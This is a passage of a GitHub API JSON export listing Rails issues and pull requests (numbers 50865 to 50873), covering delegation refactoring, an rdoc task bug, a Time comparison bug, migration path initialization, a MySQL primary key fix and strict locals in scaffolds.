            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50873/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50872",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50872/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50872/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50872/events",
        "html_url": "https://github.com/rails/rails/pull/50872",
        "id": 2100047070,
        "node_id": "PR_kwDNIULOZQwMBA",
        "number": 50872,
        "title": "Improve Active Support delegation",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            },
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-25T10:20:04Z",
        "updated_at": "2024-01-25T11:16:18Z",
        "closed_at": "2024-01-25T11:16:18Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50872",
            "html_url": "https://github.com/rails/rails/pull/50872",
            "diff_url": "https://github.com/rails/rails/pull/50872.diff",
            "patch_url": "https://github.com/rails/rails/pull/50872.patch",
            "merged_at": "2024-01-25T11:16:18Z"
        },
        "body": "There is a handful of different cleanup and optimization. See each individual commit for the full context.\r\n\r\n- The implementation has moved into `ActiveSupport::Delegation`, `Module#delegate` and `Module#delegate_to_missing` are now just thin delegators. This allow to stop adding constants such as `RUBY_RESERVED_KEYWORDS` into `Module`.\r\n- `Module#delegate` no longer accept the private and undocumented `as:` parameter. It's for internal use only. Internal users are converted to call `ActiveSupport::Delegation.generate`\r\n- Generate more optimized code for the very common `delegate ..., to: :class`.\r\n- Allow internal users to provide the method signature directly.\r\n\r\nIdeally `Module::DelegationError` should be deprecated, but I'm kinda worried about defining `Module#const_missing` to do that, I fear it might have unintended consequences. But there is little reason why someone would rescue `DelegationError`, so perhaps we can just remove it without a deprecation cycle. For now I left it as a `:nodoc:` alias.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50872/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50872/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50871",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50871/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50871/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50871/events",
        "html_url": "https://github.com/rails/rails/issues/50871",
        "id": 2099518625,
        "node_id": "I_kwDNIULOfSQcoQ",
        "number": 50871,
        "title": "Running \"bundle exec rake rdoc\" more than once does not work",
        "user": {
            "login": "sato11",
            "id": 22004610,
            "node_id": "MDQ6VXNlcjIyMDA0NjEw",
            "avatar_url": "https://avatars.githubusercontent.com/u/22004610?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sato11",
            "html_url": "https://github.com/sato11",
            "followers_url": "https://api.github.com/users/sato11/followers",
            "following_url": "https://api.github.com/users/sato11/following{/other_user}",
            "gists_url": "https://api.github.com/users/sato11/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sato11/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sato11/subscriptions",
            "organizations_url": "https://api.github.com/users/sato11/orgs",
            "repos_url": "https://api.github.com/users/sato11/repos",
            "events_url": "https://api.github.com/users/sato11/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sato11/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-25T03:59:13Z",
        "updated_at": "2024-01-26T23:22:20Z",
        "closed_at": "2024-01-26T18:31:54Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n1. Run \"bundle exec rake rdoc\" to fully generate \"doc/rdoc\" contents\r\n1. Touch any file that should contain API documentation\r\n1. Run again \"bundle exec rake rdoc\"\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\n\"Only generate documentation for files that have been changed since the API was generated,\" according to [the comment](https://github.com/rails/rails/blob/v7.1.3/railties/lib/rails/api/task.rb#L163-L164).\r\n\r\n### Actual behavior\r\nAborts with messages like;\r\n\r\n```\r\nParsing sources...\r\n100% [ 1/ 1]  railties/lib/rails/api/task.rb\r\n\r\nGenerating API format into /workspaces/rails/doc/rdoc...\r\nrake aborted!\r\nCould not find main page \"/workspaces/rails/railties/RDOC_MAIN.md\" among rendered files\r\n```\r\n\r\n### Notes\r\nThe commit https://github.com/rails/rails/commit/9e99649e7e525b6ee1d4901c89711c0b0693fe4f introduced the mtime-based enhancement for those who work on the API documentation locally. However, its logic even filters out the main page, namely `railties/RDOC_MAIN.md`, which I seldom touch but is necessary for rdoc to build.\r\n\r\nNot being able to execute the task more than once seems to be a bug on one hand, but on the other hand the fact no one has ever fixed it since the change took place 7-8 years ago makes me biased to believe this is not a bug.\r\n\r\nI've followed [the rdoc section in the guides](https://edgeguides.rubyonrails.org/api_documentation_guidelines.html#rdoc) and got stuck. That's why I believe something can be fixed, but I'm afraid I'm not able to tell if this is a program issue or a documentation issue.\r\n\r\nSo I'd like to seek advice. Has anybody come across the same issue?",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50871/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50871/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50870",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50870/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50870/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50870/events",
        "html_url": "https://github.com/rails/rails/pull/50870",
        "id": 2099335207,
        "node_id": "PR_kwDNIULOZQJ62A",
        "number": 50870,
        "title": "Add tools/rdoc-to-md script",
        "user": {
            "login": "skipkayhil",
            "id": 6014046,
            "node_id": "MDQ6VXNlcjYwMTQwNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6014046?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skipkayhil",
            "html_url": "https://github.com/skipkayhil",
            "followers_url": "https://api.github.com/users/skipkayhil/followers",
            "following_url": "https://api.github.com/users/skipkayhil/following{/other_user}",
            "gists_url": "https://api.github.com/users/skipkayhil/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skipkayhil/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skipkayhil/subscriptions",
            "organizations_url": "https://api.github.com/users/skipkayhil/orgs",
            "repos_url": "https://api.github.com/users/skipkayhil/repos",
            "events_url": "https://api.github.com/users/skipkayhil/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skipkayhil/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-25T00:12:26Z",
        "updated_at": "2024-01-25T20:51:01Z",
        "closed_at": "2024-01-25T19:27:46Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50870",
            "html_url": "https://github.com/rails/rails/pull/50870",
            "diff_url": "https://github.com/rails/rails/pull/50870.diff",
            "patch_url": "https://github.com/rails/rails/pull/50870.patch",
            "merged_at": "2024-01-25T19:27:46Z"
        },
        "body": "Ref #50759\r\n\r\nGenerally the idea is:\r\n- use Prism to parse the file into AST + Comments\r\n- transform each comment block into plain RDoc (instead of RDoc in a\r\n  comment)\r\n- use RDoc's ToMarkdown class to get a Markdown representation of the\r\n  comment\r\n- transform the Markdown representation back into a comment\r\n- write a new file, skipping the lines that were previously RDoc\r\n  comments and instead inserting the new Markdown comments\r\n\r\nA little extra work has to be down for metaprogrammed documentation\r\nbecause ToMarkdown turns RDoc directives into H1s. So for these cases,\r\nthe directive is first split off the top before doing the ToMarkdown\r\ntransformation and then added back afterwards.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50870/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50870/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50869",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50869/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50869/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50869/events",
        "html_url": "https://github.com/rails/rails/pull/50869",
        "id": 2099310894,
        "node_id": "PR_kwDNIULOZQInyQ",
        "number": 50869,
        "title": "Ensure all RubyTracker RenderParsers are tested",
        "user": {
            "login": "skipkayhil",
            "id": 6014046,
            "node_id": "MDQ6VXNlcjYwMTQwNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6014046?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skipkayhil",
            "html_url": "https://github.com/skipkayhil",
            "followers_url": "https://api.github.com/users/skipkayhil/followers",
            "following_url": "https://api.github.com/users/skipkayhil/following{/other_user}",
            "gists_url": "https://api.github.com/users/skipkayhil/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skipkayhil/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skipkayhil/subscriptions",
            "organizations_url": "https://api.github.com/users/skipkayhil/orgs",
            "repos_url": "https://api.github.com/users/skipkayhil/repos",
            "events_url": "https://api.github.com/users/skipkayhil/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skipkayhil/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-24T23:44:59Z",
        "updated_at": "2024-01-27T19:43:24Z",
        "closed_at": "2024-01-26T00:05:43Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50869",
            "html_url": "https://github.com/rails/rails/pull/50869",
            "diff_url": "https://github.com/rails/rails/pull/50869.diff",
            "patch_url": "https://github.com/rails/rails/pull/50869.patch",
            "merged_at": "2024-01-26T00:05:43Z"
        },
        "body": "### Motivation / Background\r\n\r\nPreviously, only the PrismRenderParser or RipperRenderParser would be tested depending on if the Prism gem is available. This meant that PrismRenderParser was being tested on Ruby 3.3 and RipperRenderParser was tested on Ruby < 3.3. Additionally, if someone were to add prism to the rails/rails Gemfile because they wrote a tool that uses it then the RipperRenderParser would end up completely untested.\r\n\r\n### Detail\r\n\r\nThis commit is a small refactor to enable testing both RenderParsers in all Ruby versions so that the prism gem can be added to the Gemfile.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50869/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50869/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50868",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50868/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50868/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50868/events",
        "html_url": "https://github.com/rails/rails/issues/50868",
        "id": 2099221011,
        "node_id": "I_kwDNIULOfR-SEw",
        "number": 50868,
        "title": "Comparing `Time` object with an integer doesn't throw an error ",
        "user": {
            "login": "tgxworld",
            "id": 4335742,
            "node_id": "MDQ6VXNlcjQzMzU3NDI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/4335742?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tgxworld",
            "html_url": "https://github.com/tgxworld",
            "followers_url": "https://api.github.com/users/tgxworld/followers",
            "following_url": "https://api.github.com/users/tgxworld/following{/other_user}",
            "gists_url": "https://api.github.com/users/tgxworld/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tgxworld/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tgxworld/subscriptions",
            "organizations_url": "https://api.github.com/users/tgxworld/orgs",
            "repos_url": "https://api.github.com/users/tgxworld/repos",
            "events_url": "https://api.github.com/users/tgxworld/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tgxworld/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 126910270,
                "node_id": "MDU6TGFiZWwxMjY5MTAyNzA=",
                "url": "https://api.github.com/repos/rails/rails/labels/With%20reproduction%20steps",
                "name": "With reproduction steps",
                "color": "009800",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-24T22:29:19Z",
        "updated_at": "2024-01-30T04:47:17Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\nend\r\n\r\nrequire \"active_support\"\r\nrequire \"active_support/core_ext/time\"\r\nrequire \"minitest/autorun\"\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_stuff\r\n    # This would have raise an argument error in Ruby for trying to compare a Time object with an Integer\r\n    assert Time.now >= Time.now.to_i - 999_999\r\n\r\n    assert Time.now.to_i >= Time.now.to_i - 999_999\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\nI'm not sure but I would expect one of the following:\r\n\r\n1. Raise an argument error like what Ruby does when trying to compare a `Time` object with an `Integer`\r\n2. Convert the `Time` object to an `Integer` before comparing\r\n3. Convert the `Integer` to a `Time` object before comparing\r\n\r\n### Actual behavior\r\n\r\nNo errors are raised and the code will always evaluate to `false`.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.2.2\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50868/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50868/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50867",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50867/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50867/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50867/events",
        "html_url": "https://github.com/rails/rails/pull/50867",
        "id": 2098780342,
        "node_id": "PR_kwDNIULOZPrnLA",
        "number": 50867,
        "title": "Initialize ActiveRecord::Migrator.migrations_paths at application initialization",
        "user": {
            "login": "fsateler",
            "id": 1322013,
            "node_id": "MDQ6VXNlcjEzMjIwMTM=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1322013?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fsateler",
            "html_url": "https://github.com/fsateler",
            "followers_url": "https://api.github.com/users/fsateler/followers",
            "following_url": "https://api.github.com/users/fsateler/following{/other_user}",
            "gists_url": "https://api.github.com/users/fsateler/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fsateler/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fsateler/subscriptions",
            "organizations_url": "https://api.github.com/users/fsateler/orgs",
            "repos_url": "https://api.github.com/users/fsateler/repos",
            "events_url": "https://api.github.com/users/fsateler/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fsateler/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-24T17:44:10Z",
        "updated_at": "2024-01-24T17:46:06Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50867",
            "html_url": "https://github.com/rails/rails/pull/50867",
            "diff_url": "https://github.com/rails/rails/pull/50867.diff",
            "patch_url": "https://github.com/rails/rails/pull/50867.patch",
            "merged_at": null
        },
        "body": "This is already done in rake tasks in the `load_config` task. However, if migrations want to be manipulated/used by a non-rake program this initialization would miss any extra directories configured by the user.\r\n\r\nWe move the initialization to an initializer block. With this we can remove the rake config since it depends on `environment` anyway.\r\n\r\n### Motivation / Background\r\n\r\nIn our app we use schema-based multitenancy which means we need to setup and migrate for each tenant. We have created\r\na few helpers to aid in this task. \r\nRecently, we began modularizing our app, and started moving our migrations into packs. \r\nThen we started facing issues with migrations that tried to run more than once.\r\nWe diagnosed the root cause that our tenant creation command was not invoking `db:load_config` before loading the schema.\r\nThis resulted in \"packed\" migrations not being recorded in the initial seed of the `schema_migrations` table. Then when we attempted to run migrations on that tenant those migrations would try to run and fail. \r\n\r\nThis Pull Request has been created because a fix for this is to ensure whenever the app is loaded, the correct default paths\r\nare loaded.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the initialization from a rake task to the app initialization process.\r\n\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50867/reactions",
            "total_count": 3,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 3,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50867/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50866",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50866/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50866/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50866/events",
        "html_url": "https://github.com/rails/rails/pull/50866",
        "id": 2098740196,
        "node_id": "PR_kwDNIULOZPpaew",
        "number": 50866,
        "title": "[mysql] Fix primary key auto-population for models backed by views",
        "user": {
            "login": "nvasilevski",
            "id": 5512772,
            "node_id": "MDQ6VXNlcjU1MTI3NzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nvasilevski",
            "html_url": "https://github.com/nvasilevski",
            "followers_url": "https://api.github.com/users/nvasilevski/followers",
            "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
            "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
            "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
            "repos_url": "https://api.github.com/users/nvasilevski/repos",
            "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-24T17:21:06Z",
        "updated_at": "2024-01-25T15:04:27Z",
        "closed_at": "2024-01-25T15:04:23Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": true,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50866",
            "html_url": "https://github.com/rails/rails/pull/50866",
            "diff_url": "https://github.com/rails/rails/pull/50866.diff",
            "patch_url": "https://github.com/rails/rails/pull/50866.patch",
            "merged_at": null
        },
        "body": "Fixes https://github.com/rails/rails/issues/49950 but for mysql\r\n\r\nThis commit addresses the same issue fixed by c2c861f98ae25d0daa177898db48f12de1065cf6 but for MySQL. The main fix is the removal of unnecessary `!_read_attribute(column)` check which was preventing the auto-generated PK value from being set on the record.\r\n\r\nThis change also revealed an issue with the `_returning_columns_for_insert` list built when using one of the MySQL adapters. The list had excessive number of column names even though MySQL is only capable of returning one column value, which is the last inserted ID. This commit overrides the `return_value_after_insert?` for mysql adapters to only return `true` for `auto_increment?` column unless database supports `RETURNING` statement.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50866/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50866/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50865",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50865/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50865/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50865/events",
        "html_url": "https://github.com/rails/rails/pull/50865",
        "id": 2098464124,
        "node_id": "PR_kwDNIULOZPaREg",
        "number": 50865,
        "title": "Scaffold view templates using Strict Locals",
        "user": {
            "login": "seanpdoyle",
            "id": 2575027,
            "node_id": "MDQ6VXNlcjI1NzUwMjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2575027?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/seanpdoyle",
            "html_url": "https://github.com/seanpdoyle",
            "followers_url": "https://api.github.com/users/seanpdoyle/followers",
            "following_url": "https://api.github.com/users/seanpdoyle/following{/other_user}",
            "gists_url": "https://api.github.com/users/seanpdoyle/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/seanpdoyle/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/seanpdoyle/subscriptions",
            "organizations_url": "https://api.github.com/users/seanpdoyle/orgs",
            "repos_url": "https://api.github.com/users/seanpdoyle/repos",
            "events_url": "https://api.github.com/users/seanpdoyle/events{/privacy}",
            "received_events_url": "https://api.github.com/users/seanpdoyle/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-24T15:00:56Z",
        "updated_at": "2024-01-26T03:56:42Z",
        "closed_at": "2024-01-26T01:45:21Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50865",
            "html_url": "https://github.com/rails/rails/pull/50865",
            "diff_url": "https://github.com/rails/rails/pull/50865.diff",
            "patch_url": "https://github.com/rails/rails/pull/50865.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nStrict template locals were introduced as part of the [7.1 Release][].\r\n\r\n### Detail\r\n\r\nTo encourage their use within new applications and files, this commit changes scaffolded (for example, `_form.html.erb` and `_$MODEL.html.erb`) templates to use [Strict Locals][].\r\n\r\nIn addition to scaffolds, this commit includes\r\n`app/views/active_storage/blobs/_blob.html.erb`, since it's copied into host applications as part of `rails actiontext:install`.\r\n\r\n[7.1 Release]: https://edgeguides.rubyonrails.org/7_1_release_notes.html#allow-templates-to-set-strict-locals\r\n[Strict Locals]: https://guides.rubyonrails.org/v7.1.0/action_view_overview.html#strict-locals\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50865/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50865/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50864",
